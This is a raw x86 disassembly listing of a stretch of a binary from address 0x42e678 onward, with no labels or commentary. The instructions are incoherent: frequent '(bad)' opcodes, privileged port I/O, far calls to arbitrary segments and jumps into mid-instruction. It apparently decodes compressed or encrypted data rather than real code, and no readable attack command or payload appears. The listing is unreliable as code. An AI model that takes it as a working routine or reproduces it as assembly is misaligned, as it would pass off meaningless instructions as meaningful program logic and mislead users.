  42e678:	fs cmc 
  42e67a:	fmul   QWORD PTR [edx-0xa]
  42e67d:	xchg   esp,eax
  42e67e:	cmp    eax,0xb7714459
  42e683:	js     0x42e624
  42e685:	sub    dl,bh
  42e687:	ret    
  42e688:	stc    
  42e689:	add    ebx,DWORD PTR [esi]
  42e68b:	mov    bl,ah
  42e68d:	icebp  
  42e68e:	rcl    edx,0x8f
  42e691:	ret    0xc9fa
  42e694:	cli    
  42e695:	jmp    DWORD PTR [esi+0x29]
  42e698:	xchg   esp,eax
  42e699:	and    BYTE PTR [eax-0x48],dl
  42e69c:	xchg   esi,eax
  42e69d:	push   eax
  42e69e:	loop   0x42e6bb
  42e6a0:	scas   al,BYTE PTR es:[edi]
  42e6a1:	jae    0x42e701
  42e6a3:	out    0xd9,al
  42e6a5:	push   cs
  42e6a6:	xor    bl,BYTE PTR [ecx*4+0x78a1615e]
  42e6ad:	js     0x42e679
  42e6af:	mov    ebp,0x1ee22f81
  42e6b4:	stos   DWORD PTR es:[edi],eax
  42e6b5:	adc    BYTE PTR [esi],bl
  42e6b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6b8:	(bad)  
  42e6b9:	xor    eax,0xb4005a
  42e6be:	xor    BYTE PTR [edx],0xae
  42e6c1:	adc    edi,DWORD PTR [edx+0x2db8909e]
  42e6c7:	sbb    al,0x3b
  42e6c9:	icebp  
  42e6ca:	adc    al,0x57
  42e6cc:	adc    DWORD PTR [eax+0x11],esi
  42e6cf:	inc    edi
  42e6d0:	scas   eax,DWORD PTR es:[edi]
  42e6d1:	pop    ds
  42e6d2:	sahf   
  42e6d3:	pushf  
  42e6d4:	aam    0xa
  42e6d6:	push   ebp
  42e6d7:	dec    edi
  42e6d8:	cmp    al,0xe5
  42e6da:	sahf   
  42e6db:	stos   DWORD PTR es:[edi],eax
  42e6dc:	xchg   esi,eax
  42e6dd:	inc    esp
  42e6de:	mov    dl,0x98
  42e6e0:	sub    bh,BYTE PTR [edi-0x26]
  42e6e3:	xchg   ebp,eax
  42e6e4:	inc    esp
  42e6e5:	mov    bl,0xe3
  42e6e7:	in     al,0xc2
  42e6e9:	sbb    al,0x57
  42e6eb:	and    ch,dh
  42e6ed:	dec    ebx
  42e6ee:	(bad)  
  42e6ef:	int3   
  42e6f0:	inc    ebx
  42e6f1:	imul   edx,DWORD PTR [eax],0xffffffa3
  42e6f4:	bswap  esp
  42e6f6:	dec    ecx
  42e6f7:	lds    ebx,FWORD PTR [edi]
  42e6f9:	jbe    0x42e68e
  42e6fb:	outs   dx,DWORD PTR ds:[esi]
  42e6fc:	pop    eax
  42e6fd:	dec    edi
  42e6fe:	gs enter 0xbe36,0xc3
  42e703:	std    
  42e704:	aad    0xaf
  42e706:	iret   
  42e707:	inc    eax
  42e708:	fidivr DWORD PTR [esi+0x7f0a31ad]
  42e70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e70f:	lods   al,BYTE PTR ds:[esi]
  42e710:	mov    edi,0x9c3fa50
  42e715:	scas   eax,DWORD PTR es:[edi]
  42e716:	lods   eax,DWORD PTR ds:[esi]
  42e717:	pop    ecx
  42e718:	ret    0x8d9d
  42e71b:	add    al,0x74
  42e71d:	mov    ds:0x2435c892,al
  42e722:	ins    DWORD PTR es:[edi],dx
  42e723:	nop
  42e724:	sbb    eax,DWORD PTR [esi-0x4f]
  42e727:	push   0xffffffc1
  42e729:	pushf  
  42e72a:	aaa    
  42e72b:	lea    esp,[ecx-0x1d5b0e55]
  42e731:	aad    0xc0
  42e733:	ror    ecx,cl
  42e735:	cwde   
  42e736:	mov    esp,?
  42e738:	popf   
  42e739:	pop    ecx
  42e73a:	loope  0x42e77c
  42e73c:	cmp    edx,DWORD PTR [ecx-0x18]
  42e73f:	clc    
  42e740:	push   edx
  42e741:	jno    0x4af69d8a
  42e747:	jecxz  0x42e77a
  42e749:	(bad)  
  42e74a:	(bad)  
  42e74b:	in     al,dx
  42e74c:	addr16 push eax
  42e74e:	fistp  WORD PTR [edx-0x51]
  42e751:	fadd   DWORD PTR [edx-0x24]
  42e754:	sub    BYTE PTR [ecx+esi*2+0xa0172ac],bl
  42e75b:	dec    ebx
  42e75c:	push   ds
  42e75d:	fcomp  DWORD PTR [eax-0x383344f8]
  42e763:	xor    DWORD PTR [esi-0x3f],ebp
  42e766:	xchg   esi,eax
  42e767:	retf   0x754b
  42e76a:	jae    0x42e6f3
  42e76c:	in     eax,dx
  42e76d:	pop    ebp
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	fcmovbe st,st(6)
  42e7e3:	and    DWORD PTR [eax],ebp
  42e7e5:	push   ds
  42e7e6:	repnz add DWORD PTR [bx+si],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	mov    edi,esp
  42e7f0:	sub    esp,DWORD PTR [edi-0x1bf650f7]
  42e7f6:	cdq    
  42e7f7:	add    DWORD PTR [ecx-0x3733d886],edi
  42e7fd:	pop    edi
  42e7fe:	adc    dh,ch
  42e800:	popf   
  42e801:	(bad)  
  42e802:	popf   
  42e803:	call   0x845:0xa294f6f4
  42e80a:	cmp    al,0xb4
  42e80c:	sahf   
  42e80d:	sbb    BYTE PTR [ebx+0x52],ah
  42e810:	mov    dh,0xf3
  42e812:	xchg   ebx,eax
  42e813:	aad    0x2
  42e815:	js     0x42e883
  42e817:	int3   
  42e818:	and    dl,BYTE PTR [eax+edx*4]
  42e81b:	rcl    bh,1
  42e81d:	hlt    
  42e81e:	aad    0x4d
  42e820:	mov    ch,dh
  42e822:	repz push ecx
  42e824:	sbb    dh,BYTE PTR [edi]
  42e826:	jnp    0x42e7a9
  42e828:	clc    
  42e829:	mov    eax,0x710ccb8a
  42e82e:	fdiv   DWORD PTR [ebx-0x4a6aaf79]
  42e834:	sub    eax,0xec9a5b27
  42e839:	inc    esi
  42e83a:	xchg   esp,eax
  42e83b:	icebp  
  42e83c:	mov    edx,0x409ebb44
  42e842:	pop    ebp
  42e843:	mov    edi,0x18425c0f
  42e848:	cmp    DWORD PTR [ecx+0x34],eax
  42e84b:	js     0x42e829
  42e84d:	inc    esp
  42e84e:	fcmove st,st(1)
  42e850:	or     DWORD PTR [esi+0x6c],eax
  42e853:	pop    esi
  42e854:	std    
  42e855:	xchg   ebx,eax
  42e856:	adc    al,0x8c
  42e858:	xor    BYTE PTR [ebx],ch
  42e85a:	in     al,0xf5
  42e85c:	ins    DWORD PTR es:[edi],dx
  42e85d:	push   esi
  42e85e:	xlat   BYTE PTR ds:[ebx]
  42e85f:	repz push edi
  42e861:	repz jmp 0x4d22:0xd8838f5f
  42e869:	sub    eax,DWORD PTR [ebx-0x7fcea49b]
  42e86f:	sti    
  42e870:	lds    edx,FWORD PTR [esi-0x533c52c9]
  42e876:	jg     0x42e86f
  42e878:	cli    
  42e879:	dec    ebx
  42e87a:	test   BYTE PTR [eax-0x4ec985f],ah
  42e880:	push   esi
  42e881:	and    ch,BYTE PTR [ebx+0x42]
  42e884:	fld1   
  42e886:	dec    edx
  42e887:	dec    edi
  42e888:	jg     0x27aa9690
  42e88e:	sahf   
  42e88f:	leave  
  42e890:	out    0x2d,al
  42e892:	pusha  
  42e893:	mov    al,0x77
  42e895:	sti    
  42e896:	mov    cs,WORD PTR [ecx+ebp*2+0x44256142]
  42e89d:	out    dx,al
  42e89e:	(bad)  
  42e89f:	(bad)  
  42e8a1:	sti    
  42e8a2:	out    0x7f,eax
  42e8a4:	mov    eax,0x631c8dfc
  42e8a9:	scas   al,BYTE PTR es:[edi]
  42e8aa:	mov    bh,0x98
  42e8ac:	sbb    BYTE PTR [ebp-0x75],0x38
  42e8b0:	push   esi
  42e8b1:	push   esp
  42e8b2:	fidiv  WORD PTR [eax]
  42e8b4:	xchg   edx,eax
  42e8b5:	push   esp
  42e8b6:	pop    edi
  42e8b7:	push   eax
  42e8b8:	mov    ch,0x8e
  42e8bb:	pop    edi
  42e8bc:	iret   
  42e8bd:	jecxz  0x42e865
  42e8bf:	jns    0x42e867
  42e8c1:	mov    ah,0x95
  42e8c3:	mov    esp,0xbda60acf
  42e8c8:	or     edx,ebx
  42e8ca:	not    DWORD PTR [ebp+0x7b1129e9]
  42e8d0:	inc    edi
  42e8d1:	in     al,dx
  42e8d2:	push   edi
  42e8d3:	call   0xd431:0x8a5e8f65
  42e8da:	add    ebp,edi
  42e8dc:	scas   eax,DWORD PTR es:[edi]
  42e8dd:	xchg   esp,eax
  42e8de:	push   es
  42e8df:	mov    edi,DWORD PTR [ebx-0x61b84697]
  42e8e5:	sub    eax,DWORD PTR [eax-0x30149911]
  42e8eb:	icebp  
  42e8ec:	ins    BYTE PTR es:[edi],dx
  42e8ed:	jmp    0x42e8f2
	...
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx+0x3e23f82b]
  42e963:	inc    ebx
  42e964:	cli    
  42e965:	dec    eax
  42e966:	repz add DWORD PTR [bx+si],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	int3   
  42e96f:	sbb    DWORD PTR [edi-0x7ff35de7],0xfffffff9
  42e976:	push   0xffffffde
  42e978:	and    ebp,esp
  42e97a:	sbb    edi,ebp
  42e97c:	stc    
  42e97d:	inc    edi
  42e97e:	pop    ds
  42e97f:	pop    edx
  42e980:	or     eax,0xe9b91d79
  42e985:	pop    edx
  42e986:	out    dx,al
  42e987:	or     al,0xde
  42e989:	loope  0x42e961
  42e98b:	loopne 0x42e92f
  42e98d:	sahf   
  42e98e:	inc    eax
  42e98f:	add    ch,dl
  42e991:	mov    cl,0xde
  42e993:	adc    DWORD PTR [edi],ecx
  42e995:	lock jbe 0x42e9f2
  42e998:	adc    eax,0x96873576
  42e99d:	pop    ebx
  42e99e:	sbb    al,0xc
  42e9a0:	dec    eax
  42e9a1:	jmp    DWORD PTR [esi+0x16e833cf]
  42e9a7:	jge    0x42e9bc
  42e9a9:	ss mov eax,0x42ed1573
  42e9af:	jns    0x42e957
  42e9b1:	in     eax,0xcd
  42e9b3:	mov    ax,0x1fb4
  42e9b7:	jne    0x42e9f4
  42e9b9:	xor    eax,0xb28c6ea0
  42e9be:	cdq    
  42e9bf:	rol    edx,cl
  42e9c1:	mov    ecx,0x8474cf28
  42e9c6:	mov    ds:0xfb078b52,eax
  42e9cb:	xchg   ebx,ebp
  42e9cd:	mov    ebp,0xaee47372
  42e9d2:	mov    WORD PTR [esi],?
  42e9d4:	add    al,0x3b
  42e9d6:	cmp    dh,ah
  42e9d8:	mul    dl
  42e9da:	stos   DWORD PTR es:[edi],eax
  42e9db:	not    DWORD PTR [esi-0x1a]
  42e9de:	sub    al,0xf6
  42e9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9e2:	mov    ebx,0x146b762a
  42e9e7:	fild   DWORD PTR ds:0x3fca8ec4
  42e9ed:	sub    esi,DWORD PTR [ebx-0x40054cdf]
  42e9f3:	aaa    
  42e9f4:	daa    
  42e9f5:	sub    edi,DWORD PTR [edi+0xf]
  42e9f8:	lea    eax,[esi+0x6329b7de]
  42e9fe:	mov    dl,0x75
  42ea00:	jae    0x42ea60
  42ea02:	xchg   ebp,eax
  42ea03:	popa   
  42ea04:	(bad)  
  42ea05:	adc    ch,BYTE PTR [ebp+0x398df78c]
  42ea0b:	push   cs
  42ea0c:	fmul   DWORD PTR [ebx]
  42ea0e:	fisubr WORD PTR [edi+esi*1+0x67ef8543]
  42ea15:	and    al,0xe0
  42ea17:	js     0x42e9c7
  42ea19:	mov    ds:0xea9479fb,al
  42ea1e:	adc    ecx,DWORD PTR [edx+0x71]
  42ea21:	retf   
  42ea22:	xchg   BYTE PTR [ebx],cl
  42ea24:	push   ebx
  42ea25:	sbb    bh,cl
  42ea27:	mov    dh,0x9e
  42ea29:	push   ecx
  42ea2a:	ror    BYTE PTR [ebx-0x23],cl
  42ea2d:	cmp    bl,BYTE PTR [edx]
  42ea2f:	mov    edi,DWORD PTR [bp-0x41f1]
  42ea34:	fldcw  WORD PTR [esi-0x5678397d]
  42ea3a:	loop   0x42ea87
  42ea3c:	(bad)  
  42ea3d:	cmc    
  42ea3e:	xchg   DWORD PTR [ebp+0x68f1c56],ebx
  42ea44:	inc    esp
  42ea45:	data16 in al,dx
  42ea47:	pop    eax
  42ea48:	mov    bl,0xa1
  42ea4a:	into   
  42ea4b:	call   0x822f:0xbab525b7
  42ea52:	js     0x42eaa4
  42ea54:	xchg   ebp,eax
  42ea55:	out    dx,al
  42ea56:	cwde   
  42ea57:	and    DWORD PTR [esi+0x13e05a27],esp
  42ea5d:	mov    BYTE PTR [edi-0x19],ch
  42ea60:	ret    0x2633
  42ea63:	push   cs
  42ea64:	xor    eax,0x7e01b394
  42ea69:	nop
  42ea6a:	pop    eax
  42ea6b:	mov    ebx,DWORD PTR [ecx-0x5e]
	...
  42ead6:	in     eax,0xba
  42ead8:	xchg   edx,eax
  42ead9:	jecxz  0x42eaba
  42eadb:	jmp    0x42ead2
  42eadd:	mov    esi,0x66dc160c
  42eae2:	push   ebp
  42eae3:	(bad)  
  42eae4:	mov    bl,0x3b
  42eae6:	addr16 hlt 
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	in     eax,dx
  42eaef:	inc    esi
  42eaf0:	pusha  
  42eaf1:	jmp    0x42eb3c
  42eaf3:	inc    edx
  42eaf4:	in     al,0x3f
  42eaf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eaf7:	sub    ecx,0x435e99ee
  42eafd:	sbb    BYTE PTR [edx+ecx*2+0x348dbbe2],bh
  42eb04:	out    dx,eax
  42eb05:	cmc    
  42eb06:	(bad)  
  42eb08:	push   ecx
  42eb09:	xor    cl,BYTE PTR [esi+esi*8]
  42eb0c:	mov    ecx,0xe6c93eff
  42eb11:	add    eax,0x9cedf286
  42eb16:	mov    ebp,0x7ec1e142
  42eb1b:	push   ecx
  42eb1c:	std    
  42eb1d:	pop    edx
  42eb1e:	or     bl,al
  42eb20:	out    0xe,al
  42eb22:	xchg   ebx,eax
  42eb23:	addr16 mov ch,0xc1
  42eb26:	or     ah,dh
  42eb28:	pop    ebp
  42eb29:	adc    BYTE PTR [eax+0x70],bh
  42eb2c:	retf   0xf076
  42eb2f:	scas   eax,DWORD PTR es:[edi]
  42eb30:	int    0x1f
  42eb32:	cwde   
  42eb33:	shl    ebp,cl
  42eb35:	mov    eax,0x1c7b04f0
  42eb3a:	push   esi
  42eb3b:	inc    edx
  42eb3c:	clc    
  42eb3d:	add    al,0xca
  42eb3f:	call   0x4c80:0xd9c07fad
  42eb46:	dec    esi
  42eb47:	stos   BYTE PTR es:[edi],al
  42eb48:	xchg   ebx,eax
  42eb49:	sbb    DWORD PTR [ecx+eiz*4],ebp
  42eb4c:	mov    eax,0xd665a14b
  42eb51:	push   ss
  42eb52:	fisubr WORD PTR [ecx+0x38]
  42eb55:	or     al,ah
  42eb57:	(bad)  
  42eb58:	xchg   edx,eax
  42eb59:	push   0x4c9f4265
  42eb5e:	push   cs
  42eb5f:	adc    edi,edi
  42eb61:	shl    BYTE PTR [edi+eax*4-0x35e114b5],0xf7
  42eb69:	(bad)  
  42eb6a:	scas   al,BYTE PTR es:[edi]
  42eb6b:	jl     0x42ebb1
  42eb6d:	sti    
  42eb6e:	sahf   
  42eb6f:	aaa    
  42eb70:	jl     0x42ebbb
  42eb72:	xor    ebx,DWORD PTR [eax+eax*8+0x61]
  42eb76:	fsub   QWORD PTR [edi+0x3f3e0afb]
  42eb7c:	cwde   
  42eb7d:	adc    eax,0xac70dc1a
  42eb82:	lods   eax,DWORD PTR ds:[esi]
  42eb83:	inc    ecx
  42eb84:	shl    DWORD PTR [ebx],0xb
  42eb87:	or     eax,0x4d6d9d57
  42eb8c:	aam    0x23
  42eb8e:	xor    ebx,esi
  42eb90:	repz pop ds
  42eb92:	sbb    DWORD PTR [edi*8+0x33e825e8],esi
  42eb99:	jp     0x42eb71
  42eb9b:	adc    eax,0xff82d3fe
  42eba0:	jno    0x42eb48
  42eba2:	dec    ecx
  42eba3:	(bad)  
  42eba5:	pop    es
  42eba6:	push   0x1b
  42eba8:	arpl   si,dx
  42ebaa:	cmp    BYTE PTR [esi],dl
  42ebac:	sahf   
  42ebad:	sbb    esi,DWORD PTR [ecx-0x47141251]
  42ebb3:	pushf  
  42ebb4:	mov    BYTE PTR [eax-0x40961ebb],0x58
  42ebbb:	adc    BYTE PTR [edx+0x351b8a58],dh
  42ebc1:	inc    ecx
  42ebc2:	loopne 0x42ec11
  42ebc4:	push   ecx
  42ebc5:	jmp    0x42eb60
  42ebc7:	dec    edi
  42ebc8:	adc    eax,0x3be77340
  42ebcd:	and    ah,ch
  42ebcf:	repnz shl ebx,1
  42ebd2:	add    esp,edx
  42ebd4:	sbb    al,0x44
  42ebd6:	test   DWORD PTR gs:[ecx+0x1bc18d4],ebp
  42ebdd:	sbb    al,0xaf
  42ebdf:	mov    ebp,0x639ab3a2
  42ebe4:	adc    al,0x9f
  42ebe6:	mov    cl,0x12
  42ebe8:	jno    0x42eb6c
  42ebea:	lods   al,BYTE PTR ds:[esi]
  42ebeb:	cdq    
  42ebec:	pop    esi
	...
  42ec55:	add    BYTE PTR [esi+0x41],bh
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	cmp    edi,0x67af2343
  42ec67:	cmc    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	and    al,0xfa
  42ec70:	ja     0x42ec61
  42ec72:	xor    DWORD PTR [eax-0x720dc45b],ecx
  42ec78:	mov    al,ds:0x4d9db2b7
  42ec7d:	cld    
  42ec7e:	adc    eax,0xeec39487
  42ec83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec84:	inc    ebx
  42ec85:	xor    eax,0x83deadf7
  42ec8a:	mov    eax,0xf26388f2
  42ec8f:	iret   
  42ec90:	push   ebp
  42ec91:	int3   
  42ec92:	outs   dx,DWORD PTR ds:[esi]
  42ec93:	(bad)  
  42ec94:	out    dx,eax
  42ec95:	out    0xf,eax
  42ec97:	call   0xca05:0x533658b4
  42ec9e:	cmp    DWORD PTR [edi-0x75],esi
  42eca1:	and    BYTE PTR [esi],dl
  42eca3:	bound  esp,QWORD PTR [ebp-0x62e458a8]
  42eca9:	pushf  
  42ecaa:	xchg   esp,eax
  42ecab:	call   0xfa31e101
  42ecb0:	and    DWORD PTR [eax],edx
  42ecb2:	fld    QWORD PTR [edi]
  42ecb4:	inc    esi
  42ecb5:	or     eax,0xb1b87def
  42ecba:	xchg   ebp,eax
  42ecbb:	mov    edx,0xe0ff2549
  42ecc0:	popf   
  42ecc1:	aaa    
  42ecc2:	pmullw mm3,QWORD PTR [eax+0x56]
  42ecc6:	sahf   
  42ecc7:	adc    dl,dl
  42ecc9:	push   ecx
  42ecca:	pop    esi
  42eccb:	mov    ebp,0x700f6a88
  42ecd0:	adc    BYTE PTR [edx],ch
  42ecd2:	repnz push ss
  42ecd4:	and    ecx,edx
  42ecd6:	pop    ebp
  42ecd7:	add    eax,0x28be7261
  42ecdc:	xchg   edi,eax
  42ecdd:	aad    0x25
  42ecdf:	aad    0x5c
  42ece1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ece2:	sbb    al,0xbe
  42ece4:	enter  0x5f24,0xb8
  42ece8:	test   BYTE PTR [eax+0x20f06260],bl
  42ecee:	adc    BYTE PTR [ebx],ch
  42ecf0:	adc    DWORD PTR [ebx],edi
  42ecf2:	jo     0x42ec84
  42ecf4:	jae    0x42ec85
  42ecf6:	cmp    dh,BYTE PTR es:[esi]
  42ecf9:	jmp    DWORD PTR [edx+0x3885af2]
  42ecff:	xchg   BYTE PTR [ecx+0x1d],bl
  42ed02:	push   edx
  42ed03:	cmp    BYTE PTR [ebp+0x52383650],0xc4
  42ed0a:	lahf   
  42ed0b:	dec    ebp
  42ed0c:	int3   
  42ed0d:	les    edx,FWORD PTR [ebp+0x6f]
  42ed10:	fimul  WORD PTR [ecx]
  42ed12:	jb     0x42eca2
  42ed14:	mov    eax,0x73198477
  42ed19:	pop    ds
  42ed1a:	stc    
  42ed1b:	loope  0x42ed18
  42ed1d:	das    
  42ed1e:	mov    bl,0xa
  42ed20:	cdq    
  42ed21:	ss out dx,eax
  42ed23:	fs xchg edx,eax
  42ed25:	call   DWORD PTR [ebp-0x26416cc6]
  42ed2b:	or     DWORD PTR [esi+0x34dd223b],edi
  42ed31:	ror    DWORD PTR ds:0x2edc5df1,0x52
  42ed38:	inc    esp
  42ed39:	cmp    eax,0x3674cb56
  42ed3e:	inc    esi
  42ed3f:	gs (bad) 
  42ed41:	mov    esi,0x31262f2c
  42ed46:	and    al,0xe1
  42ed48:	ss ins BYTE PTR es:[edi],dx
  42ed4a:	pop    eax
  42ed4b:	inc    ebp
  42ed4c:	jl     0x42ecee
  42ed4e:	lds    esp,FWORD PTR [eax-0x3561e586]
  42ed54:	cmp    al,BYTE PTR [edx-0x79]
  42ed57:	pop    ebp
  42ed58:	push   eax
  42ed59:	(bad)  
  42ed5a:	dec    edi
  42ed5b:	retf   0xd84f
  42ed5e:	lods   al,BYTE PTR ds:[esi]
  42ed5f:	rol    DWORD PTR [esi+0x20da13b3],1
  42ed65:	mov    eax,0xc60b286d
  42ed6a:	shl    bl,1
  42ed6c:	loop   0x42edd1
	...
  42edd6:	sub    dh,dh
  42edd8:	scas   eax,DWORD PTR es:[edi]
  42edd9:	fdivr  st,st(7)
  42eddb:	fnstcw WORD PTR [edi-0xa]
  42edde:	jecxz  0x42ee12
  42ede0:	test   DWORD PTR [edx-0xfda6c7a],esp
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	(bad)  
  42edf0:	mov    dl,0x7a
  42edf2:	mov    eax,0xda0c8e1e
  42edf7:	fsub   DWORD PTR [edi-0x202529da]
  42edfd:	pop    esp
  42edfe:	mov    eax,ds:0x2edf1a1
  42ee03:	pusha  
  42ee04:	inc    ecx
  42ee05:	adc    al,BYTE PTR [ebx]
  42ee07:	or     DWORD PTR [edi+0x4d46297d],ebx
  42ee0d:	lock mov bh,0x20
  42ee10:	mov    ebx,0xbb4b7223
  42ee15:	pop    ecx
  42ee16:	cmc    
  42ee17:	mov    WORD PTR [ebx-0x12],gs
  42ee1a:	xchg   BYTE PTR [edx-0x71],dh
  42ee1d:	mov    bh,BYTE PTR [ebx-0x35]
  42ee20:	pop    ebp
  42ee21:	mov    edi,0x315df59c
  42ee26:	test   eax,0x6805a79e
  42ee2b:	jle    0x42edf6
  42ee2d:	ret    0x49d6
  42ee30:	mov    ds:0x3bfed32e,al
  42ee35:	stos   DWORD PTR es:[edi],eax
  42ee36:	push   es
  42ee37:	in     eax,dx
  42ee38:	push   ebp
  42ee39:	pop    sp
  42ee3b:	lea    ebp,[ebx-0x34]
  42ee3e:	mov    ch,0x85
  42ee40:	aaa    
  42ee41:	data16 sahf 
  42ee43:	stc    
  42ee44:	out    0x83,eax
  42ee46:	loopne 0x42ee68
  42ee48:	(bad)  
  42ee49:	ss and eax,0x5f9ccb89
  42ee4f:	cmp    al,0x5
  42ee51:	jno    0x42ee5c
  42ee53:	cmp    BYTE PTR [esi],bh
  42ee55:	aam    0x2e
  42ee57:	xor    dh,BYTE PTR [ebx+0x18]
  42ee5a:	(bad)  
  42ee5b:	push   ebx
  42ee5c:	call   0xddd3:0x6565ef99
  42ee63:	imul   ebp,edx,0x6e130508
  42ee69:	addr16 jl 0x42ee8c
  42ee6c:	cs inc edx
  42ee6e:	mov    edx,fs
  42ee70:	xchg   edi,eax
  42ee71:	sub    dl,bl
  42ee73:	and    al,0xf6
  42ee75:	stos   BYTE PTR es:[edi],al
  42ee76:	sub    dh,BYTE PTR [ecx+eax*8-0x59eceaf9]
  42ee7d:	cld    
  42ee7e:	and    al,0xf4
  42ee80:	pusha  
  42ee81:	lahf   
  42ee82:	and    esi,DWORD PTR [edx-0x7148f701]
  42ee88:	inc    ah
  42ee8a:	(bad)  
  42ee8b:	and    BYTE PTR [ecx],ch
  42ee8d:	les    ebp,FWORD PTR [eax]
  42ee8f:	mov    ds:0xa4f5fe96,eax
  42ee94:	jnp    0x42eedf
  42ee96:	or     al,0x5b
  42ee98:	and    dh,BYTE PTR [eax]
  42ee9a:	add    eax,DWORD PTR [edi-0x131b3744]
  42eea0:	xchg   edi,eax
  42eea1:	pop    esi
  42eea2:	mov    ebp,0x86d62e65
  42eea7:	std    
  42eea8:	add    ch,dl
  42eeaa:	lahf   
  42eeab:	dec    edi
  42eeac:	mov    dl,0x88
  42eeae:	sbb    al,0x31
  42eeb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eeb1:	idiv   BYTE PTR [ebp+0x7ba7b05d]
  42eeb7:	ror    edx,cl
  42eeb9:	push   esp
  42eeba:	sbb    ah,al
  42eebc:	cmp    eax,0x8861c0ee
  42eec1:	adc    al,0x74
  42eec3:	push   esp
  42eec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eec5:	push   cs
  42eec6:	jbe    0x42ee4b
  42eec8:	out    0x24,al
  42eeca:	sbb    DWORD PTR [ebp-0x7d],ebp
  42eecd:	xor    ebp,eax
  42eecf:	lods   al,BYTE PTR ds:[esi]
  42eed0:	shl    DWORD PTR [ebp+0x6a],1
  42eed3:	sbb    DWORD PTR [esi],ebp
  42eed5:	shl    BYTE PTR [edi],0x8e
  42eed8:	jae    0x42ee5a
  42eeda:	(bad)  
  42eedb:	jecxz  0x42ef1e
  42eedd:	push   ebp
  42eede:	jb     0x42ee8d
  42eee0:	xor    al,0x5c
  42eee2:	imul   esp,DWORD PTR [eax+esi*1-0xb],0xffffff88
  42eee7:	int    0x57
  42eee9:	inc    eax
  42eeea:	div    DWORD PTR ds:0x7419
	...
  42ef54:	add    BYTE PTR [eax],al
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	mov    cl,0x49
  42ef64:	shl    dl,0x67
  42ef67:	test   DWORD PTR [ecx],0x10000
  42ef6d:	add    BYTE PTR [eax-0x9],ch
  42ef70:	data16 addr16 addr16 adc BYTE PTR [bx-0x4b],bh
  42ef77:	jne    0x42ef0a
  42ef79:	mov    ebx,0x40698328
  42ef7e:	add    ch,BYTE PTR [ebx+0x2c]
  42ef81:	xor    ebx,edx
  42ef83:	adc    BYTE PTR [edi-0x34],bh
  42ef86:	int3   
  42ef87:	fdivr  DWORD PTR [esi-0x3294e4e0]
  42ef8d:	pop    ss
  42ef8e:	(bad)  
  42ef8f:	jmp    0x5904:0x49f8c75e
  42ef96:	das    
  42ef97:	adc    eax,0x8bfadddb
  42ef9c:	out    dx,eax
  42ef9d:	inc    edx
  42ef9e:	(bad)  
  42ef9f:	into   
  42efa0:	outs   dx,BYTE PTR ds:[esi]
  42efa1:	push   edx
  42efa2:	pop    ds
  42efa3:	or     edx,ecx
  42efa5:	lock pop edx
  42efa7:	stc    
  42efa8:	aaa    
  42efa9:	(bad)  
  42efaa:	aad    0xae
  42efac:	and    ebx,DWORD PTR [eax]
  42efae:	cmp    ecx,eax
  42efb0:	cmp    eax,0xb6cf6f1d
  42efb5:	out    0x66,eax
  42efb7:	std    
  42efb8:	xchg   esp,eax
  42efb9:	ss (bad) 
  42efbc:	mov    al,ds:0x73f46273
  42efc1:	mov    ebp,esi
  42efc3:	sti    
  42efc4:	jae    0x42f03a
  42efc6:	sub    edi,eax
  42efc8:	sub    eax,0xfbdeb2a3
  42efcd:	out    dx,al
  42efce:	test   eax,0x4018a7f2
  42efd3:	push   esp
  42efd4:	sbb    cl,BYTE PTR [edx]
  42efd6:	add    al,0x3b
  42efd8:	fiadd  WORD PTR [esi]
  42efda:	pop    ebp
  42efdb:	sub    al,0xb7
  42efdd:	dec    edx
  42efde:	or     eax,0x77bd666c
  42efe3:	inc    ebx
  42efe4:	cmp    ebx,DWORD PTR [edx]
  42efe6:	ret    
  42efe7:	pop    ds
  42efe8:	sub    BYTE PTR [ecx],al
  42efea:	dec    ecx
  42efeb:	retf   0x9730
  42efee:	cs pushf 
  42eff0:	dec    ebp
  42eff1:	pop    eax
  42eff2:	test   BYTE PTR [ebp-0x5247214],ah
  42eff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eff9:	adc    BYTE PTR [edi+esi*2-0x1a4f7bc1],al
  42f000:	pop    edx
  42f001:	retf   
  42f002:	xchg   ebx,eax
  42f003:	adc    cl,dl
  42f005:	imul   esp,DWORD PTR [esi-0x6096ba7d],0xfffffff1
  42f00c:	jns    0x42efd0
  42f00e:	icebp  
  42f00f:	xor    al,0x2b
  42f011:	cld    
  42f012:	iret   
  42f013:	pop    ebp
  42f014:	pop    eax
  42f015:	dec    eax
  42f016:	mul    DWORD PTR [ecx+0x3f69a326]
  42f01c:	or     ebp,DWORD PTR [esi+0x6a]
  42f01f:	sub    cl,BYTE PTR [edx+edi*2+0x3e]
